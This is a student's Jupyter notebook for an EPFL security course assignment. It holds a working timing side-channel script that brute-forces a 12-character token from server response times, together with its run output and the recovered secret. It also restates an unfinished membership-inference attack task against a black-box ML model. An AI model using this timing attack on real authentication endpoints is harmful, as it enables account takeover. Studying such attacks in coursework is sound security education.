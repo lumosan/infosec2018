{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Ex3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Actual code:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import string\n",
    "import json\n",
    "import requests\n",
    "import numpy as np\n",
    "\n",
    "url = 'http://com402.epfl.ch/hw5/ex3'\n",
    "headers = {'Content-Type': 'application/json'}\n",
    "\n",
    "# Generate set of some characters\n",
    "chars = string.digits + string.ascii_lowercase\n",
    "groups=1\n",
    "\n",
    "length = 12\n",
    "iterations = 10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0   <Response [500]>\n",
      "1   <Response [500]>\n",
      "2   <Response [500]>\n",
      "3   <Response [500]>\n",
      "4   <Response [500]>\n",
      "5   <Response [500]>\n",
      "6   <Response [500]>\n",
      "7   <Response [500]>\n",
      "8   <Response [500]>\n",
      "9   <Response [500]>\n",
      "a   <Response [500]>\n",
      "b   <Response [500]>\n",
      "c   <Response [500]>\n",
      "d   <Response [500]>\n",
      "d\n",
      "0   <Response [500]>\n",
      "1   <Response [500]>\n",
      "2   <Response [500]>\n",
      "3   <Response [500]>\n",
      "4   <Response [500]>\n",
      "5   <Response [500]>\n",
      "6   <Response [500]>\n",
      "7   <Response [500]>\n",
      "8   <Response [500]>\n",
      "9   <Response [500]>\n",
      "a   <Response [500]>\n",
      "b   <Response [500]>\n",
      "c   <Response [500]>\n",
      "d   <Response [500]>\n",
      "d3\n"
     ]
    }
   ],
   "source": [
    "## Find first two characters\n",
    "pwd_found = ''\n",
    "res = []\n",
    "for i in range(len(pwd_found), 2, groups):\n",
    "    pwd_suffix = '.' * (11 - i)\n",
    "    times = []\n",
    "    \n",
    "    for c in chars:\n",
    "        times_c = []\n",
    "        pwd = pwd_found + c + pwd_suffix\n",
    "        for i in range(iterations):\n",
    "            assert len(pwd) == 12, str(pwd)\n",
    "            payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd}\n",
    "            response = requests.post(url, data=json.dumps(payload), headers=headers)\n",
    "            times_c.append(response.elapsed.total_seconds())\n",
    "        times.append(times_c)\n",
    "        print(c,' ', response)\n",
    "\n",
    "    res.append(times)\n",
    "    \n",
    "    # select the one with largest time\n",
    "    times_np = np.array(times).sum(axis=1)\n",
    "    pwd_found = pwd_found + chars[times_np.argmax()]\n",
    "    print(pwd_found)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4.590165"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "pwd_found='d3' # I found it from the previous code, but it sometimes gets sth different...\n",
    "\n",
    "payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd_found+'.'*(12-len(pwd_found))}\n",
    "# Do it twice bc it sometimes does weird things...\n",
    "response = requests.post(url, data=json.dumps(payload), headers=headers)\n",
    "response = requests.post(url, data=json.dumps(payload), headers=headers)\n",
    "time = response.elapsed.total_seconds()\n",
    "time"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {
    "scrolled": false
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Looking for char nb. 6\n",
      "d3bf4a0..... <Response [500]> 4.530052\n",
      "d3bf4a1..... <Response [500]> 4.590623\n",
      "d3bf4a2..... <Response [500]> 5.322067\n",
      "break 1\n",
      "d3bf4a2\n",
      "break 2\n",
      "Looking for char nb. 7\n",
      "d3bf4a20.... <Response [500]> 5.319972\n",
      "d3bf4a21.... <Response [500]> 5.316648\n",
      "d3bf4a22.... <Response [500]> 5.324252\n",
      "d3bf4a23.... <Response [500]> 5.320518\n",
      "d3bf4a24.... <Response [500]> 5.321962\n",
      "d3bf4a25.... <Response [500]> 6.057325\n",
      "break 1\n",
      "d3bf4a25\n",
      "break 2\n",
      "Looking for char nb. 8\n",
      "d3bf4a250... <Response [500]> 6.047669\n",
      "d3bf4a251... <Response [500]> 6.053697\n",
      "d3bf4a252... <Response [500]> 6.047237\n",
      "d3bf4a253... <Response [500]> 6.055074\n",
      "d3bf4a254... <Response [500]> 6.020897\n",
      "d3bf4a255... <Response [500]> 6.083057\n",
      "d3bf4a256... <Response [500]> 6.053617\n",
      "d3bf4a257... <Response [500]> 6.052491\n",
      "d3bf4a258... <Response [500]> 6.057054\n",
      "d3bf4a259... <Response [500]> 6.04875\n",
      "d3bf4a25a... <Response [500]> 6.026275\n",
      "d3bf4a25b... <Response [500]> 6.772261\n",
      "break 1\n",
      "d3bf4a25b\n",
      "break 2\n",
      "Looking for char nb. 9\n",
      "d3bf4a25b0.. <Response [500]> 6.812827\n",
      "d3bf4a25b1.. <Response [500]> 6.771121\n",
      "d3bf4a25b2.. <Response [500]> 6.796526\n",
      "d3bf4a25b3.. <Response [500]> 6.776247\n",
      "d3bf4a25b4.. <Response [500]> 6.793118\n",
      "d3bf4a25b5.. <Response [500]> 6.77945\n",
      "d3bf4a25b6.. <Response [500]> 6.997939\n",
      "d3bf4a25b7.. <Response [500]> 6.785738\n",
      "d3bf4a25b8.. <Response [500]> 7.612504\n",
      "break 1\n",
      "d3bf4a25b8\n",
      "break 2\n",
      "Looking for char nb. 10\n",
      "d3bf4a25b80. <Response [500]> 7.611889\n",
      "d3bf4a25b81. <Response [500]> 8.348519\n",
      "break 1\n",
      "d3bf4a25b81\n",
      "break 2\n",
      "Looking for char nb. 11\n",
      "d3bf4a25b810 <Response [500]> 8.34763\n",
      "d3bf4a25b811 <Response [500]> 8.351728\n",
      "d3bf4a25b812 <Response [500]> 8.351211\n",
      "d3bf4a25b813 <Response [500]> 8.346337\n",
      "d3bf4a25b814 <Response [500]> 8.346591\n",
      "d3bf4a25b815 <Response [500]> 8.347041\n",
      "d3bf4a25b816 <Response [500]> 8.273677\n",
      "d3bf4a25b817 <Response [200]> 9.057875\n",
      "break 1\n",
      "d3bf4a25b817\n",
      "break 2\n"
     ]
    }
   ],
   "source": [
    "## Look for rest of characters\n",
    "for j in range(len(pwd_found), length, groups):\n",
    "    print(\"Looking for char nb.\", j)\n",
    "    pwd_suffix = '.' * (11 - j)\n",
    "    found = False\n",
    "    \n",
    "    for i in range(iterations):\n",
    "        for c in chars:\n",
    "            times_c = []\n",
    "            pwd = pwd_found + c + pwd_suffix\n",
    "            assert len(pwd) == 12, str(pwd)\n",
    "            payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd}\n",
    "            response = requests.post(url, data=json.dumps(payload), headers=headers)\n",
    "            delay = response.elapsed.total_seconds()\n",
    "            print(pwd, response, delay)\n",
    "            \n",
    "            if delay >= time + .45:\n",
    "                print(\"break 1\")\n",
    "                time = delay\n",
    "                pwd_found = pwd_found + c\n",
    "                print(pwd_found)\n",
    "                found = True\n",
    "                break\n",
    "\n",
    "        if found:\n",
    "            print(\"break 2\")\n",
    "            break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "#pwd_found = 'd3bf4a2kTZgs'\n",
    "pwd_found = 'd3bf4a25b817'"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 50,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "LXWO83EV/SROOkxJb6JuGWaZIMm5uKdErsBF4DSkmyc=\n"
     ]
    }
   ],
   "source": [
    "# Get token\n",
    "payload = {'email': 'lucia.monterosanchis@epfl.ch', 'token': pwd_found}\n",
    "response = requests.post(url, data=json.dumps(payload), headers=headers)\n",
    "print(response.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Ex4"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "You can upload your **dataset** and **data classification task** to the service and pay it to construct a model, then ObjectiveToday makes available the trained model through an API (*black-box model*). There's a way to infer whether a given patient was part\n",
    "of the training set of the model, *by only querying this black-box model*.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "To begin with, take a look at a very recent, well-written paper [1,2] that describes this attack in the wild. You’ll perform a similar (simpler) attack.\n",
    "\n",
    "For this assignment, we have trained an ML model using images from the **CIFAR-100**\n",
    "dataset (images belonging to 100 classes). Please\n",
    "use the dataset for Python. Read the\n",
    "data with `load_cifar100_data()` in `utils_handouts.py`\n",
    "\n",
    "Our ML model (**the target model**), is available for you to query in a\n",
    "docker image, in a black-box fashion: given an image, the model answers with the\n",
    "probabilities of the image being in each of the 100 classes.\n",
    "\n",
    "To query the target model:\n",
    "* `sudo systemctl start docker`\n",
    "* Download the docker image `sudo docker pull dedis/com402_hw5_ex4`\n",
    "* Start the docker image `sudo docker run --rm -it -name hw5ex4 dedis/com402_hw5_ex4`\n",
    "* Copy your own test image batch in docker, which contains 100 test images (more details about downloading the image batch follow in the subsection *Goal*). This command needs to be executed in the host\n",
    "\n",
    "`docker cp images_JohnDoe.npy hw5ex4:/target/images_JohnDoe.npy`\n",
    "\n",
    "* Finally, query the target model with one of the images in the batch file. You’ll pass to the command the path and name of the batch file, as well as the index of the image you want to query, from 0 to 99 inclusive. This command needs to be executed in the docker container.\n",
    "\n",
    "`python3 run_target.py images_JohnDoe.npy 1`\n",
    "\n",
    "* Disconnect from Docker: `sudo systemctl stop docker`\n",
    "\n",
    "**You need at least 70 correct predictions, using keras. You have to upload a json of the format:**\n",
    "`{\"email\":\"lucia.monterosanchis@epfl.ch\",\"predictions\":\"[bit1,bit2...]\"}`\n",
    "\n",
    "as a POST request to `http://com402.epfl.ch/hw5/ex4_predictions`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "from utils_handouts import load_batch_images, load_batch_labels"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# load images and labels\n",
    "# labels are only necessary to train the attacker models,\n",
    "# not for querying the docker target model\n",
    "images = load_batch_images(\"images_lucia.monterosanchis@epfl.ch.npy\")\n",
    "labels = load_batch_labels(\"labels_lucia.monterosanchis@epfl.ch.npy\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import tensorflow, keras\n",
    "print(tensorflow.__version__)\n",
    "print(keras.__version__)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "nb_shadow_models = 10\n",
    "nb_samples = 5000\n",
    "batch_size=100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Submit"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "!curl -X POST -H \"Content-Type: application/json\" -d '{\"email\":\"lucia.monterosanchis@epfl.ch\",\"predictions\":\"[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]\"}' http://com402.epfl.ch/hw5/ex4_predictions"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
